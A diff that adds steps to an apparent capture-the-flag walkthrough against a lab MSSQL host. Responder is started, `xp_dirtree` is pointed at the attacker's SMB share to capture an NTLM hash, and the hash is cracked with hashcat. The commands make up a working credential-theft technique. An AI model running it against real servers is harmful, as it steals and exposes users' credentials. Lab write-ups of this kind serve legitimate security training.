@@ -201,4 +201,26 @@ impacket-mssqlclient reporting@10.10.10.125 -windows-auth
 xp_dirtree C:\\Users
 ```
 
+Then I started responder:
+
+```bash
+responder -I tun0
+```
+
+In my mssql session I run again `xp_dirtree` again my fake SMB share:
+
+```bash
+exec xp_dirtree '//<YOUR IP>/fake_dir',1,0
+```
+![Screenshot from 2025-05-28 20-50-45](https://github.com/user-attachments/assets/5a6826e0-3012-48d8-b976-c4b1b52f4749)
+
+I grab the hash with responder:
+
+![Screenshot from 2025-05-28 20-51-08](https://github.com/user-attachments/assets/80fa2ad6-a039-49a9-8bef-e4dcaa3d83a6)
+
+I save it on a file.
+Then I crack it using hashcat:
+
+![Screenshot from 2025-05-28 20-51-39](https://github.com/user-attachments/assets/62ae700a-4117-4922-932c-0057c7386713)
+
 ---
